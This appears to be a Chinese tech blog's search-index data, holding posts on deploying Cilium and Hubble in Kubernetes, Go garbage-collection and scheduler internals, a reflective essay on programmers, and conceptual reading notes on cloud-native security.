命令查看运行的“节点”\" docker ps 命令查看运行的“节点” 容器中代理服务的配置 值得一提的是，受限于国内网络环境情况，许多镜像在拉取时会出现问题，这将导致 Kubernetes 部署一些 Pod 的时候会出现经常失败的情况。因此，我在 Systemd 启动 Docker 守护进程的相关配置中增加了相关的代理配置内容，具体的可以参考 HTTP/HTTPS proxy ，这样便可以在 Docker 容器内注入相关的环境变量，实现代理。 还有一种方式是通过 kind load 命令向相关容器中加载指定的镜像，但是这种方式在一些特殊的场景下比较麻烦，有兴趣的朋友可以试试。 代理的问题 当你选择代理后，会出现非常多奇奇怪怪的问题，这在很多情况下是因为代理网络与集群网络的原因。 一个比较典型的例子是访问某些 Pod 容器中进程暴露的健康状态检测探针 REST API 接口。因为代理的原因，你很有可能访问不到相关资源的路径，从而导致超时，进而 k8s 会根据相关的策略去重启相关的服务，如此反复。 安装 Cilium CLI 终端并在集群中部署 Cilium 根据官方文档，我们下一步需要安装 Cilium 的 CLI 二进制程序，该程序用于提供自动在 k8s 集群中部署安装 Cilium 提供的 CNI 实现以及能够检查 Cilium 的安装状态，启停相关特性等功能。出于安全原因的考虑，你可以参考官方文档来完成此步骤的安装。 在 Cilium 部署相关组件时，执行相关命令的进程会阻塞等待 k8s 集群完成组件的部署，我们可以在另一个命令行终端中执行 kubectl get pods --all-namespace -w 来实时查看相关进度。 郁闷 k8s 在相关节点拉取 YAML 文件中指定的镜像时并没有能够显示拉取进度的地方，有时候都不知道网络是不是正常的，只能等到它失败或是成功，心里没底，有点慌。 一切都正常执行完毕后，你可以使用 cilium status 命令来查看集群中 Cilium 的状态， cilium status 命令执行\" cilium status 命令执行 启用 Hubble UI Hubble 是 Cilium 项目的可观测层，它可以用来获取集群范围内在网络以及安全层面的可观测性，从而为运维人员提供进行排障工作的信息依据。 执行 cilium hubble enable --ui 启用 hubble UI 特性，Cilium 将会通过 Patch cilium-confg、重启 Cilium Pods 、部署 Hubble UI 相关组件的方式来启用相关服务，最终部署执行完成后执行 cilium hubble ui 命令将相关服务映射到我们本地的端口上，访问相关页面，可以看到 hubble-ui 与服务健康检测探针之间通信的数据流。 Hubble UI 前端页面\" Hubble UI 前端页面 部署一些简单的 Workload （Star Wars Demo）并在 Hubble UI 中观察网络流 Cilium 官方文档中提供了一些示例 Demo 展示 Cilium 基于身份和 HTTP 的策略执行，其中一个 Demo 便是 Star Wars ⭐。根据 Docs 里的示例，我们可以快速部署这样的 Demo Workload。官方给出的 Demo 应用拓扑结构图如下所示， 应用拓扑结构图\" 应用拓扑结构图 我们可以通过调用这几个服务的 REST API 接口来产生相应的网络流量，比如在 xwing Pod 中调用 kubectl exec xwing -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing 向 deathstar 服务的 /v1/request-landing 接口发出降落请求，该服务会将该请求转发给相应的后端 Pod 处理。 同样，我们也可以在 tierfighter 中执行相似的命令，kubectl exec tiefighter -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing，其效果与上一个例子相似。我们能够在 hubble-ui 的 default 命名空间下看到相关 Pod 的网络流量，如下所示， default 命名空间下 Pods 间的网络流量\" default 命名空间下 Pods 间的网络流量 不过，这里有一个奇怪的地方，盟军的 xwing 战机竟然能够落到帝国的 deathstar 上！这里我们便引出本文后续的内容，使用 Cilium 对网络流量进行 Policy Enforement。 使用 Cilium 对 Layer 3, 4, 7 流量进行控制 所有的 Pod 在 Cilium 中都表示为一个 Endpoint，我们在 Cilium Pod 上执行 cilium 工具去将集群中 Endpoints 罗列出来， $ kubectl -n kube-system exec cilium-gvmxn -- cilium endpoint list Defaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init) ENDPOINT POLICY (ingress) POLICY (egress) IDENTITY LABELS (source:key[=value]) IPv6 IPv4 STATUS ENFORCEMENT ENFORCEMENT 858 Disabled Disabled 1 k8s:node-role.kubernetes.io/control-plane ready k8s:node.kubernetes.io/exclude-from-external-load-balancers reserved:host 889 Disabled Disabled 26464 k8s:io.cilium.k8s.namespace.labels.kubernetes.io/metadata.name=kube-system 10.244.","date":"2022-09-27","objectID":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/:0:1","tags":["eBPF","kubernetes","cilium"],"title":"在 K8s 集群上部署 Cilium 与 Hubble","uri":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/"},{"categories":null,"content":"总结 Cilium 使用 eBPF 技术实现 CNI 网络插件，并且利用 eBPF 在安全方面的能力，实现用户自定义策略的 Policy Enforcement，这让人们看到 eBPF 在网络与安全方面的巨大潜能。不过，Cilium 项目本身还有许多可以改进的地方。 比如我们在上述的 Hubble UI 中看到的数据维度还是相对来说较为单一的，只能看见数据包的端到端的流向而无法看到其中的载荷信息，也不能通过前端运维面板或 dashboard 的形式实时下发策略。另外，在安全策略编写方面的可扩展性和语义仍较为简单，编写具有丰富安全上下文信息的安全策略受限（可以看看 OPA，或者cel-go？）。 笔者认为在云原生环境下，架构的复杂性以及通信的流量的纵横交错本身就会给系统的观测和维护带来挑战，但于此同时也会带来巨大的上下文环境语义信息，业界对于可观测性也有比较好的解决方案（Tracing、Logging、Metric），安全作为系统的重要一环，本身就可以受益于可观测性提升带来的可供分析的信息量增加。强语义、智能的 Policy Enforcement 结合 HIDS、IAST、RASP 等前沿安全技术的应用，能够解决大多数云原生应用场景下的运行安全问题，能够给运维工程师、安全工程师提供充分、精确的数据去分析相关的安全事件，从而能够尽早进行研判、封堵，形成安全事件闭环。 平台层应用除了提供数据的采集、聚合/聚类、关联、可视化、持久化之外，还需要提供主动的手段，对相关行为进行反制。譬如对实时的入侵者进行热动态蜜罐迁移、身份实体封禁，化被动安全为主动安全。 猜想 eBPF 与网络相关的程序中有 XDP 和 TC 类别，TC 程序能够访问内核的路由表，从而决定数据包发出的方向，使用 eBPF 技术可以实现 LoadBalancer，对 L3/L4 层流量进行负载均衡，这是在分布式系统中架构中的使用。 在安全方案，这种动态低成本的网络“改道”能力似乎很适合用作蜜罐，云原生环境下可以快速部署一个容器环境，并将被标记的相关流量牵引于此，由于是蜜罐，我们可以在里面加载尽可能多的探针，尽可能精确的捕获攻击者的行为图谱，从而发现业务代码的漏洞，并对其进行及时的修复和处理。 ","date":"2022-09-27","objectID":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/:0:2","tags":["eBPF","kubernetes","cilium"],"title":"在 K8s 集群上部署 Cilium 与 Hubble","uri":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/"},{"categories":null,"content":"说在前面 🐹 WIP ","date":"2022-09-25","objectID":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/:1:0","tags":["golang"],"title":"Golang 面试驱动学习","uri":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/"},{"categories":null,"content":"Go 运行时行为 🐹 WIP GC 触发时机 GC 触发的入口为 runtime.gcStart() 垃圾收集被触发后会通过 runtime.gcTrigger.test() 方法检测当前是否需要触发垃圾收集，该方法会根据三种方式触发不同的检查， gcTriggerHeap：堆内存分配达到控制器计算的触发堆大小 gcTriggerTime：如果一段时间内没有触发，就会触发新一轮的循环，该触发条件由 runtime.forcegcperiod 变量控制，默认时间为 2 分钟 gcTriggerperiod：如果当前没有开启垃圾收集，则触发新的循环 所有出现 runtime.gcTrigger 结构体的位置都是触发垃圾收集的代码位置 runtime.sysmon 和 runtime.forcegchelper —— 后台运行定时检查和垃圾收集；（gcTriggerTime） runtime.GC —— 用户程序手动触发垃圾收集；（gcTriggerCycle） runtime.mallocgc —— 申请内存时根据堆大小触发垃圾收集 （ gcTriggerHeap） 🤔 你该怎么回答？ GC 触发时机按照触发的行为主体可以大致分为两类，一类是由用户主动触发，另一类是运行时系统依据某些条件自动触发。 用户触发：用户可以在用户代码中通过调用 runtime.GC() ，以 gcTriggerCycle 充当谓词构建 gcTrigger 结构体，调用 runtime.gcStart() 触发垃圾收集；（这里会不会真正触发垃圾收集还要看当前是否就是处在垃圾收集的阶段，也就是说用户手动触发垃圾收集前，GC 已经启动了。这将通过 runtime.gcTrigger.test() 方法进行检测） 系统监控触发：在 runtime.sysmon 与 runtime.forcegchelper 中会以 gcTriggerTime 充当谓词构建 gcTrigger 结构体，调用 (gcTrigger).test() 方法检测当前是否需要触发一次 GC。若距离上一次 GC 的时间超过了一定的阈值（由 forcegcperiod 变量决定，该变量的默认值是 2 * 60 * 1e9 也就是两分钟），则会触发一次 GC。 由 mallocgc 触发：在 runtime.mallocgc() 代码的结尾会以 gcTriggerHeap 充当谓词构建 gcTrigger 结构体，调用 (gcTrigger).test() 方法检测当前是否需要触发一次GC。若当前堆的大小大于通过步调算法计算得出的下一次 GC 触发大小，则会触发一次 GC，在代码中为 gcController.heapLive \u003e= gcController.trigger 时 (gcTrigger).test() 方法返回 True。步调算法核心思想是控制内存增长的比例，可以通过 GOGC 和 debug.SetGCPercent 进行控制。其通过计算得出的下一次 GC 时堆大小的阈值 gcController.trigger，来控制 GC 触发的时间点，进而保证最后 GC 结束时堆大小应该小于算法得出的目标堆大小。下图展示的是这个过程， 步调 (Pacing) 算法实现目标\" 步调 (Pacing) 算法实现目标 g 的调度流程 我们使用 go 关键字可以轻松创建一个 goroutine, 并在其中执行我们的用户代码，快速地实现并发编程。这简单的用户层面使用语法，背后是运行时调度系统做的一系列复杂的工作，这里简单的描述一下相关的过程。 Go 语言中的调度流程与 GMP 模型的设计息息相关，但本文这里并不会去介绍相关 GMP 模型的内容，我们更希望将关注的焦点放在运行时的调度行为上。用户使用 go 关键字创建一个 goroutine 后，运行时会对其进行一系列的初始化操作，并将其加入到相关 P 的本地可运行队列中，等待一下次调度循环中被选中执行。我们关键就来看一看这一个 runtime.schedule 函数具体都干了些什么工作。 runtime.schedule 将主要的寻找可运行 g 的逻辑写到了 runtime.findRunnable 函数中，其会从下面几处查找待执行的 goroutine， 为了保证公平，当全局运行队列中有待执行的 Goroutine 时，通过 schedtick 保证有一定概率（从源代码中看，每过61次调度循环便会主动先去 GRQ 中找是否有可运行的 g）会从全局的运行队列中查找对应的 Goroutine； // Check the global runnable queue once in a while to ensure fairness. // Otherwise two goroutines can completely occupy the local runqueue // by constantly respawning each other. if _p_.schedtick%61 == 0 \u0026\u0026 sched.runqsize \u003e 0 { lock(\u0026sched.lock) gp = globrunqget(_p_, 1) unlock(\u0026sched.lock) if gp != nil { return gp, false, false } } 从处理器（P）的 LRQ 中查找待执行的 Goroutine； // local runq if gp, inheritTime := runqget(_p_); gp != nil { return gp, inheritTime, false } 从 GRQ 中查找待执行的 Goroutine； // global runq if sched.runqsize != 0 { lock(\u0026sched.lock) gp := globrunqget(_p_, 0) unlock(\u0026sched.lock) if gp != nil { return gp, false, false } } 从网络轮询器中查找是否有 Goroutine 等待运行； // Poll network. // This netpoll is only an optimization before we resort to stealing. // We can safely skip it if there are no waiters or a thread is blocked // in netpoll already. If there is any kind of logical race with that // blocked thread (e.g. it has already returned from netpoll, but does // not set lastpoll yet), this thread will do blocking netpoll below // anyway. if netpollinited() \u0026\u0026 atomic.Load(\u0026netpollWaiters) \u003e 0 \u0026\u0026 atomic.Load64(\u0026sched.lastpoll) != 0 { if list := netpoll(0); !list.empty() { // non-blocking gp := list.pop() injectglist(\u0026list) casgstatus(gp, _Gwaiting, _Grunnable) if trace.enabled { traceGoUnpark(gp, 0) } return gp, false, false } } 通过 runtime.runqsteal 尝试从其他随机的处理器（P）中窃取待运行的 Goroutine，该函数还可能窃取处理器（P）的计时器。 // Spinning Ms: steal work from other Ps. // // Limit the number of spinning Ms to half the number of busy Ps. // This is necessary to prevent excessive CPU consumption when // GOMAXPROCS\u003e\u003e1 but the program parallelism is low. procs := uint32(gomaxprocs) if _g_.m.spinning || 2*atomic.Load(\u0026sched.nmspinning) \u003c procs-atomic.Load(\u0026sched.npidle) { if !_g_.m.spinning { _g_.m.spinning = true atomic.Xadd(\u0026sched.nmspinning, 1) } gp, inheritTime, tnow, w, newWork := stealWork(now) now = tnow if gp != nil { // Successfully stole. return gp, inheritTime, false } if newWork { // There may be new timer or GC work; restart to // discover. goto top } if w != 0 \u0026\u0026 (pollUntil ==","date":"2022-09-25","objectID":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/:1:1","tags":["golang"],"title":"Golang 面试驱动学习","uri":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/"},{"categories":null,"content":"References The Go Blog The Golang Repo Go 程序员面试笔试宝典 Go 语言原本 Go 语言设计与实现 The Go Programming Language ","date":"2022-09-25","objectID":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/:2:0","tags":["golang"],"title":"Golang 面试驱动学习","uri":"/2022-09-26-golang-%E9%9D%A2%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0.zh-ch/"},{"categories":null,"content":"文章概要 本文准备以一种轻快、对话式的口吻来描述笔者在计算机相关领域学习过程中感悟体会，其中包括一些回顾、一些建议、一些反思以及对未来的一些思考。这些内容并不是对某一领域的具体讨论，因此不会涉及相关的技术细节，读者可以抱着一种来看看故事、吹吹牛的心态阅读本篇文章，因而你不需要有任何认知上的压力。如果你在阅读完本篇文章后，能够有所收获与思考，笔者将感到由衷的高兴。 ","date":"2022-09-10","objectID":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/:0:1","tags":["知识学习分享","随谈"],"title":"程序员修炼指南","uri":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/"},{"categories":null,"content":"🤔 优秀程序员的特质：黑客与画家 OR 哲学家？ 最近看完了两本书，一本是 Paul Graham 的黑客与画家，另一本是 Linus Torvalds 的自传 Just for Fun: The Story of an Accidental Revolutionary 英文原版，看完之后我更加相信优秀的程序员在某种程度上更像是艺术工作者而不是技术工作者。他/她们对于其所从事的工作有着近乎偏执的要求以及狂热的激情，有着独特的审美趣味，最为主要的是那种极其强大的自驱力，这种自驱力不是由外部因素驱动的，例如金钱、地位、权力等世俗的东西，而是完全因为其自身的内在动力。 这种内在动力他们也不知道如何去形容，我们会经常听到这样的问题，为什么选择从事这项工作/为什么愿意投入如此之多的时间和精力在这个领域当中，这些问题的答案在我们上述讨论到的这种人群（黑客）当中往往有这样的回答，因为我做的这个事情真的非常有意思，非常好玩，将时间与精力投入与此我并不感觉虚度光阴，相反，我获得了极大的快乐。 这让我想到了月亮与六便士中的主人公斯特里克兰，其愿意抛弃其在世俗中所获得的一切，孤注一掷地投身于艺术创作当中，忽视其所处的种种不幸，以能够作画为乐，偏执、疯狂，沉溺于其中，在外人看来他与疯子无疑。在现实中我们也能找到拥有这些特质的人，Linux 之父 Linus、Elon Musk、雷军、Steve Jobs、Christopher Nolan 等以及在历史长河中留名的艺术家、哲学家们，他们都在其所处从事的领域作出了巨大的贡献留下了各自的作品，而这些成果并不是他们一开始就能够预测的到的或者说是以此为目标的，这些受世人赞赏的成就都是他们”玩“出来的，属于在特定的历史时间从事着正确的事情并产出的副产品。 这让我想起了身边的一些朋友，他们身上具备着一些相似的特质，比如理想主义者、喜欢辩论、对政治、经济等相关宽泛的议题有与主流观点不一样的看法、对他们所从事的领域充满激情、生活随性但整洁，人生规划与目标清晰，思维敏捷充满着奇思妙想等。拥有这些特质并不能说就能够在如今卷到爆炸的就业市场上拥有独特的竞争力，至少在短期来看对相关知识的掌握程度、学历背景、表达能力等更具度量性的指标上更具优势的候选人往往更具竞争力，这也是以可量化指标为评价体系的系统的系统性缺失。 在东亚圈的文化背景下，盛产卓越工程师与实干家，他们能够发现当前系统的结构型矛盾并发挥自身的聪明才智去解决当下的现实问题，也能够发现更加深层次的本质从而提出一整套解决相关问题的方法论。而西方却盛产冒险家与梦想家，在近代宽松的政治、富裕的经济条件下，那里的人们可以有更多的机会去发扬个性、发表己见，对讨论更加开放，层级关系相对而言较为松散，试错成本低，这种氛围更有利于新事物的出现和发展。因此，我们也不难发现在许多技术发源于西方，而却在东方得到的大范围的应用与实践，且基于此得到了不少的改进与提升。 对于程序员来说，他们是更加乐于接触新事物的人，开放包容的心态在团队成员之间的沟通协作中非常重要，在开源社区中我也遇到了许多大神级别的人物，他们愿意回答初级工程师提出的 ”简单的“ 问题，并且在语言的使用层面也让人感到舒服，这是纯粹的技术交流，并没有什么级别的隔阂，有问题就提出，总有人会回答你（别忘了向别人道谢，毕竟开源工作全凭热爱，花费的是别人的时间）。在这里分享一个站点，Hacker News 其中有与计算机领域相关的热点，也有与数学、物理等自然科学相关的话题，更有求职、生活、心理学等等领域的知识，只要你对知识摄入感兴趣，你就可以去这逛逛。 随着互联网的快速发展，程序员成为了这个时代最为吃香的职业之一，大量人员涌入与计算机互联网相关的领域，不知疲倦地学习领域内的相关知识，投入时间、金钱以及精力去搜刮任何一个角落，囫囵吞枣地吸收着固定的流水线模式，生成出”背书“式的代码与解答，”码农“这个词便由此而生。其实这也无可厚非，程序员被标榜着为高薪职业，自然会受到追捧，行业也从原先的百家争鸣混乱竞争的状态到形成具有成熟行业规范多雄鼎立的状态，编码以及生产都有着”最佳实践“由不得人员胡乱自由发挥，这是市场经济、行业发展的规律。市场不景气便会让原先无序扩张的现象受到遏制甚至出现反噬，具体的表现便是各大公司选择裁员以减少开支、优化业务，处在时代浪尖的人们能做的就只有疯狂内卷争夺少数的机会吗？我想你应该先停下奔波的脚步，停下来思考一下自己究竟喜欢什么，从事什么工作能让你获得最大的满足感，而不是为了物质上的利益去从事让你精神上浑浑噩噩的行业。这个东西说着十分玄幻，在日本人生哲学中有个概念叫作 IKIGAI 讲述的是人根据不同的意愿从事不同的职业领域与获得的人生意义之间的关系，有兴趣的朋友可以去了解一下。 ","date":"2022-09-10","objectID":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/:0:2","tags":["知识学习分享","随谈"],"title":"程序员修炼指南","uri":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/"},{"categories":null,"content":"🤓 学点什么 ","date":"2022-09-10","objectID":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/:0:3","tags":["知识学习分享","随谈"],"title":"程序员修炼指南","uri":"/2022-09-11-%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BF%AE%E7%82%BC%E6%8C%87%E5%8D%97/"},{"categories":null,"content":"云原生安全——攻防实践与体系构建 1云原生安全 在本章节中我们首先介绍云原生的含义和特性，然后介绍云原生安全的含义、体系、关键问题和现状。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:0:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.1云原生：云计算下半场 CNCF对云原生的见解是：“云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网络、微服务、不可变基础设施和声明式API。这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统做出频繁和可预测的重大变更。 云原生系统的一般特征： 轻、快、不变的基础设施 只更新镜像而不改变容器运行时的模式称为不变的基础设施（inmmutable infrastructure） 弹性服务编排 服务编排（orchestration）提供了分布式的计算、存储和网络资源管理功能，可以按需、弹性地控制服务的位置、容量、版本，监控并保证服务的可访问性。 开发运营一体化（Devops） Goals：缩短软件开发周期，提供高质量软件的持续交付。Devops不等于敏捷开发（更多的是在消除开发和运营侧的隔阂，聚焦于加速软件部署），但它是敏捷开发的有益补充。 Devops的开发理念：自动化构建和测试、持续集成和持续交付等 微服务架构 传统单体应用的功能被拆解成大量独立、细粒度的服务。 微服务架构使得每个服务聚焦在自己的功能上，做到小而精，然后通过应用编排组装，进而实现等价于传统单体应用的复杂功能。 其优点使后续业务修改时可复用现有的微服务，而不需要关心其内部实现，可最大限度地减少重构开销。 无服务模型 无服务聚焦在函数计算本身，隐藏了底层复杂的实现方式，使开发者能够聚焦于业务本身。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:1:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.2 什么是云原生安全 两层含义：面向云原生环境的安全和具有云原生特征的安全 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:2:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.2.1 面向云原生环境的安全 Security Goals：防护云原生环境中基础设施、编排系统和微服务等系统的安全。 这类安全机制不一定具备云原生的特性：例如分布式拒绝服务缓解机制（DDoS Mitigation）一般都是以硬件形态交付和部署的。 云原生内部的安全机制以云原生形态居多：1）服务网格的安全通常使用旁挂串接（Sidecar）的安全容器，微服务API安全通常使用微API网关容器，这些安全容器都是云原生的部署模式，具有云原生的特性。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:2:1","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.2.2 具有云原生特征的安全 具有云原生特征的各类安全机制，此类安全机制具有弹性、敏捷、轻量级、可编排等特性，它防护的对象可以是传统的业务系统。 在本书中讨论的更多是面向云原生环境的安全，即在云原生环境中识别各个系统和组件的脆弱性和安全风险，进而提出和设计面向云原生环境的安全，而相应的安全机制必须应用于云原生环境。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:2:2","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.2.3原生安全：融合的云原生安全 作者认为原生安全有两个特点：基于云原生且无处不在，即使用了云原生技术，适用于各类场景。 云原生安全能力：容器/虚拟化/宿主机运行时安全=\u003e编排平台/服务网格安全=\u003e微服务/无服务安全 原生安全架构：安全应用=\u003e安全编排=\u003e虚拟安全资源 原生安全能力：终端安全=\u003e网络安全=\u003e应用安全 当前云原生技术发展迅速，但相应的安全防护匮乏。如何将现有成熟的安全能力，如隔离、访问控制、入侵检测、应用安全，应用于云原生环境，构建安全的云原生系统。 赋予传统安全产品云原生的特性（轻/快/不变的基础设施、弹性服务编排、开发运营一体化）从而提供弹性、按需、云原生的安全能力，提高”防护——检测——响应“闭环的效率。 通过安全设备或平台云原生化后，就能提供（云）原生的安全能力，在各种场景下都能够提供弹性、按需的安全服务，最终成为无处不在的安全。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:2:3","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.3面向云原生环境的安全体系 根据云原生环境的构成，面向云原生环境的安全体系可包含三个层面的安全机制：容器安全，编排系统安全，云原生应用安全。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:3:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.3.1容器安全 容器技术是云原生体系的底层，因而容器安全也是云原生安全的基石。容器层面的安全可以分为以下几部分。 1）容器环境基础设施的安全性；侧重于运行容器的宿主机上的安全性，主机上的安全漏洞和恶意进程是否影响到容器，容器内的进程是否可以利用主机上的安全漏洞，主机上的安全配置是否回影响到其上运行的容器。 2）容器的镜像安全；镜像中的软件是否存在安全漏洞，镜像在构建过程中是否存在安全风险，镜像在传输过程中是否被恶意篡改。 3）容器运行时安全；运行时容器间的隔离是否充分，容器间的通信是否安全的，容器内的恶意程序是否回影响到主机或者其他容器，容器的资源使用情况是否安全。 4）整个容器生态的安全性；Docker自身的安全性如何？Service Mesh/Serverless 对容器安全有什么影响，容器中安全密钥的管理与传统环境有什么不同？容器化后的数据隐私保护与传统的数据隐私保护是否一致？ 容器云环境的安全可以粗略分为两个主要方面：容器云内部的安全，宿主机安全、虚拟化安全、容器（东西向）网络的安全、管理平台的安全以及数据安全等；另一方面就是容器云内外之间的网络安全，也就是通常讲的南北向网络安全。 容器云安全解决方案可以分别从两个方面进行设计：对于南北向的网络安全，可以通过安全资源池引流的方式，实现相应的安全检测与防护；对于容器云内部的安全，可以通过相应的容器安全机制实现。最后将这两部分统一接入云安全集中管理系统，进行统一的安全管理与运营。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:3:1","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.3.2 编排系统安全 Kubernetes已经成为事实上的云原生编排系统，那么Kubernetes的安全就成为非常重要的编排安全部分，本书将在第四章曝光针对Kubernetes的攻击手段。 